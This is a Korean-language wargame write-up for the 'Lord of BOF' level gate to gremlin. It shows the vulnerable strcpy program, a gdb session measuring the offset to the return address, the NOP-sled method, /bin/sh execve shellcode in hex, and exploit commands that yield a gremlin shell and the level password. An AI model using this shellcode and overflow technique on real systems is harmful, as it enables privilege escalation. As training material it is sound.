# [WriteUp]The Lord of BOF - gate → gremlin

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
[gate@localhost gate]$ cat gremlin.c
/*
	The Lord of the BOF : The Fellowship of the BOF 
	- gremlin
	- simple BOF
*/
 
int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}

```

`home` 디렉토리에서는 권한 문제 때문에 gdb로 바이너리를 분석할 수 없어서 `/tmp`로 복사해서 분석해야 한다.

```bash
[gate@localhost gate]$ cp gremlin /tmp
```

gdb에서, `strcpy()`가 호출되고 난 직후에 break point를 걸고 스택의 상태를 살펴보자.

```bash
(gdb) b* main+59
Breakpoint 1 at 0x804846b
(gdb) r AAAAAAAA
Starting program: /tmp/gremlin AAAAAAAA

Breakpoint 1, 0x804846b in main ()
(gdb) x/80wx $esp
0xbffffcc0:	0xbffffbc8	0xbffffe15	0x41414141	0x41414141
0xbffffcd0:	0x40029a00	0x40022004	0x40013868	0x40013ed0
0xbffffce0:	0x08048200	0x00003d60	0x40021ca0	0x000006f3
0xbffffcf0:	0x40021fd0	0x4001ad70	0x400143e0	0x00000003
0xbffffd00:	0x40014650	0x00000001	0xbffffc20	0x08048170
0xbffffd10:	0x400140d4	0x078e530f	0xbffffc9c	0x08048256
0xbffffd20:	0x40021ca0	0x400143e0	0xbffffcac	0x400261a6
0xbffffd30:	0x4001ead0	0x400143e0	0x40020290	0x400143e0
0xbffffd40:	0x400140d4	0x0177ff8e	0xbffffccc	0x08048244
0xbffffd50:	0x40021590	0x400143e0	0xbfffffe4	0xbffffcbf
0xbffffd60:	0x00000020	0x401081ec	0xbffffca0	0x4000a7fd
0xbffffd70:	0x40010c27	0x40014680	0x00000007	0x4000a74e
0xbffffd80:	0x08049510	0x4000ae60	0xbffffd14	0x40013ed0
0xbffffd90:	0x08048170	0x0804951c	0x08048256	0x40021ca0
0xbffffda0:	0xbffffcc8	0x4000a970	0x400f855b	0x08049510
0xbffffdb0:	0x4000ae60	0xbffffd14	0xbffffcc8	0x0804841b
0xbffffdc0:	0x080494fc	0x08049510	0xbffffce8	0x400309cb
0xbffffdd0:	0x00000002	0xbffffd14	0xbffffd20	0x40013868
0xbffffde0:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffdf0:	0x08048430	0x00000002	0xbffffd14	0x080482e0
(gdb) info register ebp
ebp            0xbffffdc8	-1073742648
(gdb) p/x 0xbffffdcc - 0xbffffcc8
$1 = 0x104
```

return address는 `$ebp+4`에 있고, 입력이 시작되는 주소가 buffer의 주소이기 때문에 두 주소의 차이를 구하면 return address를 덮기 전에 얼마나 채워야 하는지 알 수 있다. 디버깅할 때와 실제로 프로그램을 실행할 때 주소가 조금씩 달라지기 때문에 적당히 중간쯤에 쉘코드를 넣어 놓고, 그 이외의 공간은 모두 NOP로 채우고 return address를 buffer의 앞부분의 주소로 덮으면 NOP은 모두 스킵되고 쉘코드가 실행되어 쉘을 획득할 수 있을 것이다.(NOP sled)

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80`

32비트 프로그램에서 system call로 `"/bin/sh"`를 실행하는 쉘코드이다. `strcpy()`로 문자열을 복사하기 때문에 중간에 `\x00`이 있으면 안 된다.

```bash
<99\xb0\x0b\xcd\x80"+"\x90"*136+"\x10\xfd\xff\xbf"'`
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ
                                                                                                                       �������������������������������������������������������������������������������������������������������������������������������������������
bash$ whoami
gate
```

이제 이 익스플로잇을 그대로 `home`디렉토리에서 진행하면 다음 레벨로 가는 password를 얻을 수 있다. LOB에서 쉘을 획득했을 때는 `my-pass`라는 특수한 명령어를 입력하면 password를 준다.

```bash
<99\xb0\x0b\xcd\x80"+"\x90"*136+"\x10\xfd\xff\xbf"'`
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ
                                                                                                                       �������������������������������������������������������������������������������������������������������������������������������������������
bash$ whoami
gremlin
bash$ my-pass
euid = 501
hello bof world
```

